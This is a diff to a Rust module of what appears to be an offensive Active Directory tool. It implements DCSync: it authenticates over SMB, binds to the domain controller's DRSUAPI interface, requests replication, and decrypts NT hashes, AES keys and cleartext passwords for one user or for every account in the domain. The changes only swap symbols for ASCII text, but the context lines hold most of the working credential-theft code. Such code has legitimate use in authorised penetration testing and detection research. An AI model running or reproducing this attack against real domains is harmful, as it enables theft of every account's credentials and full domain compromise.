@@ -3,7 +3,7 @@
 //! Replicates a specific user's password hashes from a DC using the
 //! Directory Replication Service Remote Protocol.
 //!
-//! Flow: SMB Auth → IPC$ → \drsuapi pipe → RPC Bind → DRSBind → DRSGetNCChanges → Parse
+//! Flow: SMB Auth -> IPC$ -> \drsuapi pipe -> RPC Bind -> DRSBind -> DRSGetNCChanges -> Parse
 
 use colored::Colorize;
 use hmac::Hmac;
@@ -20,9 +20,9 @@ use crate::runner::{ForgeConfig, ForgeResult, PersistenceResult};
 #[allow(dead_code)] // Used in future DCSync implementation
 type HmacMd5 = Hmac<Md5>;
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // DRSR Interface UUID & Constants
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// MS-DRSR DRSUAPI interface UUID: e3514235-4b06-11d1-ab04-00c04fc2dcd2
 const DRSUAPI_UUID: [u8; 16] = [
@@ -44,7 +44,7 @@ const DRS_EXT_BASE: u32 = 0x04000000 // DRS_EXT_STRONG_ENCRYPTION
     | 0x00000200                      // DRS_EXT_GETCHGREQ_V8
     | 0x00004000; // DRS_EXT_GETCHGREQ_V10
 
-/// EXOP_REPL_OBJ — extended operation: replicate single object
+/// EXOP_REPL_OBJ -- extended operation: replicate single object
 const EXOP_REPL_OBJ: u32 = 0x00000006;
 
 /// Flags for DRSGetNCChanges
@@ -150,12 +150,12 @@ pub async fn dcsync_single_user(config: &ForgeConfig, target_user: &str) -> Resu
         }
     };
 
-    // ── Credentials ──
+    // -- Credentials --
     let (user, pass, nt_hash_bytes) = resolve_credentials(config)?;
 
-    // ── 1. SMB session (provides authenticated transport + session key) ──
+    // -- 1. SMB session (provides authenticated transport + session key) --
     info!(
-        "[dcsync] Connecting to DC via SMB → \\\\{}\\IPC$",
+        "[dcsync] Connecting to DC via SMB -> \\\\{}\\IPC$",
         config.dc_ip
     );
     let smb = SmbSession::connect(&config.dc_ip, &config.domain, user, pass)
@@ -167,20 +167,20 @@ pub async fn dcsync_single_user(config: &ForgeConfig, target_user: &str) -> Resu
 
     info!(
         "[dcsync] {} SMB session established, session key: {} bytes",
-        "✓".green(),
+        "[+]".green(),
         smb_session_key.len()
     );
 
-    // ── 2. RPC Bind to DRSUAPI (try protected_pipe first on WS2025+) ──
+    // -- 2. RPC Bind to DRSUAPI (try protected_pipe first on WS2025+) --
     let bind_pdu = build_rpc_bind_pdu(&DRSUAPI_UUID, DRSUAPI_VERSION);
     let bind_resp = dcsync_pipe_fallback(&smb, &bind_pdu)
         .await
         .map_err(|e| OverthroneError::custom(format!("RPC bind transport failed: {e}")))?;
 
     validate_rpc_bind_ack(&bind_resp)?;
-    info!("[dcsync] {} RPC bind to DRSUAPI accepted", "✓".green());
+    info!("[dcsync] {} RPC bind to DRSUAPI accepted", "[+]".green());
 
-    // ── 3. DRSBind (opnum 0) — get DRS context handle ──
+    // -- 3. DRSBind (opnum 0) -- get DRS context handle --
     let drs_bind_req = build_drs_bind_request();
     let drs_bind_resp = dcsync_pipe_fallback(&smb, &drs_bind_req)
         .await
@@ -188,15 +188,15 @@ pub async fn dcsync_single_user(config: &ForgeConfig, target_user: &str) -> Resu
 
     let (drs_handle, server_ext) = parse_drs_bind_response(&drs_bind_resp)?;
     info!(
-        "[dcsync] {} DRSBind successful — handle acquired, server caps: 0x{:08x}",
-        "✓".green(),
+        "[dcsync] {} DRSBind successful -- handle acquired, server caps: 0x{:08x}",
+        "[+]".green(),
         server_ext
     );
 
-    // ── 4. Compute the DRSR decryption key ──
+    // -- 4. Compute the DRSR decryption key --
     let drs_session_key = compute_drs_session_key(&smb_session_key, &nt_hash_bytes)?;
 
-    // ── 5. DRSGetNCChanges (opnum 3) — replicate the target object ──
+    // -- 5. DRSGetNCChanges (opnum 3) -- replicate the target object --
     let nc_dn = base_dn.clone();
     let gnc_req = build_drs_get_nc_changes(&drs_handle, &user_dn, &nc_dn);
     let gnc_resp = dcsync_pipe_fallback(&smb, &gnc_req)
@@ -205,7 +205,7 @@ pub async fn dcsync_single_user(config: &ForgeConfig, target_user: &str) -> Resu
 
     info!("[dcsync] DRSGetNCChanges returned {} bytes", gnc_resp.len());
 
-    // ── 6. Parse the replication response ──
+    // -- 6. Parse the replication response --
     let secrets = parse_dcsync_response(&gnc_resp, &drs_session_key, &realm)?;
 
     let extracted_count = secrets.len();
@@ -213,20 +213,20 @@ pub async fn dcsync_single_user(config: &ForgeConfig, target_user: &str) -> Resu
 
     for s in &secrets {
         info!(
-            "  {} {} → NT: {}",
-            "✓".green(),
+            "  {} {} -> NT: {}",
+            "[+]".green(),
             s.username.bold(),
             s.nt_hash.as_deref().unwrap_or("N/A").red()
         );
         if let Some(ref aes) = s.aes256_key {
-            info!("    {} AES256: {}", "→".cyan(), &aes[..32.min(aes.len())]);
+            info!("    {} AES256: {}", "->".cyan(), &aes[..32.min(aes.len())]);
         }
         if let Some(ref ct) = s.cleartext_password {
-            info!("    {} Cleartext: {}", "→".cyan(), ct.red());
+            info!("    {} Cleartext: {}", "->".cyan(), ct.red());
         }
     }
 
-    // ── 7. DRSUnbind (opnum 1) — clean up ──
+    // -- 7. DRSUnbind (opnum 1) -- clean up --
     let unbind_req = build_drs_unbind(&drs_handle);
     let _ = smb.pipe_transact("drsuapi", &unbind_req).await; // best-effort
 
@@ -251,7 +251,7 @@ pub async fn dcsync_single_user(config: &ForgeConfig, target_user: &str) -> Resu
             success,
             details,
             cleanup_command: Some(
-                "# DCSync is read-only — no cleanup needed\n\
+                "# DCSync is read-only -- no cleanup needed\n\
                  # Monitor via Event ID 4662 for detection"
                     .into(),
             ),
@@ -263,9 +263,9 @@ pub async fn dcsync_single_user(config: &ForgeConfig, target_user: &str) -> Resu
     })
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // Multi-Fragment RPC Reassembly
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Perform an RPC pipe transaction with multi-fragment PDU reassembly.
 /// The DC may respond with multiple RPC response fragments when the reply
@@ -281,9 +281,9 @@ async fn pipe_transact_reassemble(
     smb.pipe_transact_multifrag(pipe_name, request).await
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // Credential Resolution
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 fn resolve_credentials(config: &ForgeConfig) -> Result<(&str, &str, Option<Vec<u8>>)> {
     if let Some(ref pw) = config.password {
@@ -299,9 +299,9 @@ fn resolve_credentials(config: &ForgeConfig) -> Result<(&str, &str, Option<Vec<u
     }
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // RPC PDU Builders
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Build an RPC bind PDU (type 11)
 fn build_rpc_bind_pdu(iface_uuid: &[u8; 16], version: (u16, u16)) -> Vec<u8> {
@@ -355,7 +355,7 @@ fn validate_rpc_bind_ack(resp: &[u8]) -> Result<()> {
         let ptype = resp[2];
         if ptype == 13 {
             return Err(OverthroneError::custom(
-                "RPC bind_nak — interface rejected by DC",
+                "RPC bind_nak -- interface rejected by DC",
             ));
         }
         return Err(OverthroneError::custom(format!(
@@ -375,7 +375,7 @@ fn build_drs_bind_request() -> Vec<u8> {
     let client_uuid: [u8; 16] = rand::random();
     stub.extend_from_slice(&client_uuid);
 
-    // pextClient → DRS_EXTENSIONS_INT
+    // pextClient -> DRS_EXTENSIONS_INT
     stub.extend_from_slice(&2u32.to_le_bytes());
 
     let ext_payload_size: u32 = 4 + 16 + 4 + 4 + 4 + 16; // 48 bytes
@@ -423,7 +423,7 @@ fn parse_drs_bind_response(resp: &[u8]) -> Result<(Vec<u8>, u32)> {
         pos = (pos + 3) & !3; // align
     }
 
-    // phDrs — 20-byte policy/context handle
+    // phDrs -- 20-byte policy/context handle
     if pos + 20 > stub.len() {
         return Err(OverthroneError::custom(format!(
             "DRSBind: can't read context handle at offset {} (stub len {})",
@@ -459,7 +459,7 @@ fn build_drs_get_nc_changes(handle: &[u8], object_dn: &str, _nc_dn: &str) -> Vec
     // dwInVersion = 8 (DRS_MSG_GETCHGREQ_V8)
     stub.extend_from_slice(&8u32.to_le_bytes());
 
-    // ═══ DRS_MSG_GETCHGREQ_V8 ═══
+    // === DRS_MSG_GETCHGREQ_V8 ===
 
     // uuidDsaObjDest
     let dest_uuid: [u8; 16] = rand::random();
@@ -494,7 +494,7 @@ fn build_drs_get_nc_changes(handle: &[u8], object_dn: &str, _nc_dn: &str) -> Vec
     // ulMoreFlags = 0
     stub.extend_from_slice(&0u32.to_le_bytes());
 
-    // ═══ Deferred pointer data: pNC → DSNAME ═══
+    // === Deferred pointer data: pNC -> DSNAME ===
     //
     // DSNAME layout:
     //   structLen:  u32
@@ -561,14 +561,14 @@ fn build_drs_get_nc_changes_domain(
 
     let dest_uuid: [u8; 16] = rand::random();
     stub.extend_from_slice(&dest_uuid);
-    // uuidInvocIdSrc — use cursor if provided
+    // uuidInvocIdSrc -- use cursor if provided
     if let Some(c) = cursor {
         stub.extend_from_slice(&c.uuid_invoc_id_src);
     } else {
         stub.extend_from_slice(&[0u8; 16]);
     }
     stub.extend_from_slice(&1u32.to_le_bytes());
-    // usnvecFrom — use cursor if provided
+    // usnvecFrom -- use cursor if provided
     if let Some(c) = cursor {
         stub.extend_from_slice(&c.usnvec_to[0].to_le_bytes());
         stub.extend_from_slice(&c.usnvec_to[1].to_le_bytes());
@@ -611,7 +611,7 @@ fn build_drs_get_nc_changes_domain(
     build_rpc_request_pdu(3, &stub)
 }
 
-/// Perform full-domain DCSync — replicate all objects in the domain NC.
+/// Perform full-domain DCSync -- replicate all objects in the domain NC.
 /// This is the equivalent of `dcsync_single_user` but without the
 /// EXOP_REPL_OBJ flag, replicating every object in the domain.
 /// Returns both the `ForgeResult` for display and the raw `Vec<DcSyncSecrets>`
@@ -627,7 +627,7 @@ pub async fn dcsync_domain(config: &ForgeConfig) -> Result<(Vec<DcSyncSecrets>, 
     let (user, pass, nt_hash_bytes) = resolve_credentials(config)?;
 
     info!(
-        "[dcsync-full] Connecting to DC via SMB → \\\\{}\\IPC$",
+        "[dcsync-full] Connecting to DC via SMB -> \\\\{}\\IPC$",
         config.dc_ip
     );
     let smb = SmbSession::connect(&config.dc_ip, &config.domain, user, pass)
@@ -635,21 +635,21 @@ pub async fn dcsync_domain(config: &ForgeConfig) -> Result<(Vec<DcSyncSecrets>, 
         .map_err(|e| OverthroneError::Smb(format!("SMB connect failed: {e}")))?;
 
     let smb_session_key = smb.session_key().unwrap_or_default();
-    info!("[dcsync-full] {} SMB session established", "✓".green());
+    info!("[dcsync-full] {} SMB session established", "[+]".green());
 
     let bind_pdu = build_rpc_bind_pdu(&DRSUAPI_UUID, DRSUAPI_VERSION);
     let bind_resp = dcsync_pipe_fallback(&smb, &bind_pdu)
         .await
         .map_err(|e| OverthroneError::custom(format!("RPC bind failed: {e}")))?;
     validate_rpc_bind_ack(&bind_resp)?;
-    info!("[dcsync-full] {} RPC bind accepted", "✓".green());
+    info!("[dcsync-full] {} RPC bind accepted", "[+]".green());
 
     let drs_bind_req = build_drs_bind_request();
     let drs_bind_resp = dcsync_pipe_fallback(&smb, &drs_bind_req)
         .await
         .map_err(|e| OverthroneError::custom(format!("DRSBind failed: {e}")))?;
     let (drs_handle, _server_ext) = parse_drs_bind_response(&drs_bind_resp)?;
-    info!("[dcsync-full] {} DRSBind done", "✓".green());
+    info!("[dcsync-full] {} DRSBind done", "[+]".green());
 
     let drs_session_key = compute_drs_session_key(&smb_session_key, &nt_hash_bytes)?;
 
@@ -660,7 +660,7 @@ pub async fn dcsync_domain(config: &ForgeConfig) -> Result<(Vec<DcSyncSecrets>, 
     loop {
         pages += 1;
         info!(
-            "[dcsync-full] Page {} — requesting next 500 objects from {}",
+            "[dcsync-full] Page {} -- requesting next 500 objects from {}",
             pages, realm
         );
 
@@ -686,7 +686,7 @@ pub async fn dcsync_domain(config: &ForgeConfig) -> Result<(Vec<DcSyncSecrets>, 
 
         if !has_more || page_count == 0 {
             info!(
-                "[dcsync-full] No more pages — stopping after page {}",
+                "[dcsync-full] No more pages -- stopping after page {}",
                 pages
             );
             break;
@@ -694,7 +694,7 @@ pub async fn dcsync_domain(config: &ForgeConfig) -> Result<(Vec<DcSyncSecrets>, 
 
         // Safety valve: max 100 pages (50,000 objects)
         if pages >= 100 {
-            warn!("[dcsync-full] Reached max 100 pages — truncating");
+            warn!("[dcsync-full] Reached max 100 pages -- truncating");
             break;
         }
     }
@@ -707,8 +707,8 @@ pub async fn dcsync_domain(config: &ForgeConfig) -> Result<(Vec<DcSyncSecrets>, 
 
     for s in &all_secrets {
         info!(
-            "  {} {} → NT: {}",
-            "✓".green(),
+            "  {} {} -> NT: {}",
+            "[+]".green(),
             s.username.bold(),
             s.nt_hash.as_deref().unwrap_or("N/A").red()
         );
@@ -745,7 +745,7 @@ pub async fn dcsync_domain(config: &ForgeConfig) -> Result<(Vec<DcSyncSecrets>, 
     Ok((all_secrets, forge_result))
 }
 
-/// Build DRSUnbind request (opnum 1) — release context handle
+/// Build DRSUnbind request (opnum 1) -- release context handle
 fn build_drs_unbind(handle: &[u8]) -> Vec<u8> {
     let mut stub = Vec::with_capacity(24);
     stub.extend_from_slice(handle);
@@ -776,14 +776,14 @@ fn build_rpc_request_pdu(opnum: u16, stub_data: &[u8]) -> Vec<u8> {
     pdu
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // Session Key Derivation
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Compute the DRS session key used for decrypting replicated secrets.
 /// The DRS protocol uses the NTLMSSP exported session key from the SMB
 /// authentication.  The fallback path (deriving from NT hash via MD4)
-/// was incorrect and has been removed — NT-hash alone cannot reproduce
+/// was incorrect and has been removed -- NT-hash alone cannot reproduce
 /// the session base key without the NTLM challenge/response exchange.
 fn compute_drs_session_key(smb_session_key: &[u8], nt_hash: &Option<Vec<u8>>) -> Result<Vec<u8>> {
     // Primary path: use the SMB session key directly
@@ -797,21 +797,21 @@ fn compute_drs_session_key(smb_session_key: &[u8], nt_hash: &Option<Vec<u8>>) ->
         return Ok(key);
     }
 
-    // No valid session key available.  MD4(NT_Hash) is NOT the session base key —
+    // No valid session key available.  MD4(NT_Hash) is NOT the session base key --
     // the real session_base_key = HMAC-MD5(HMAC-MD5(NTHash, UPPERuser+domain), NTProofStr)
     // and requires the NTLM challenge/response from the wire.  We cannot derive it
     // from the NT hash alone, so we fail loudly here.
     let _ = nt_hash; // acknowledged but not usable
     Err(OverthroneError::custom(
-        "No SMB session key available for DCSync — provide a plaintext password or ensure \
+        "No SMB session key available for DCSync -- provide a plaintext password or ensure \
          the SMB session exported its session key (pass-the-hash requires the NT hash to \
          be fed through a full NTLMv2 challenge/response authenticated SMB connection)",
     ))
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // Response Parsing
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Parse DCSync response using the DRSR parser in overthrone-core.
 /// Returns an error on parse failure instead of silently returning an empty Vec.
@@ -892,9 +892,9 @@ fn dcsync_obj_to_secrets(obj: &drsr::ReplicatedObject, domain: &str) -> DcSyncSe
     }
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // Helpers
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 fn hex_encode_bytes(data: &[u8]) -> String {
     data.iter().map(|b| format!("{:02x}", b)).collect()
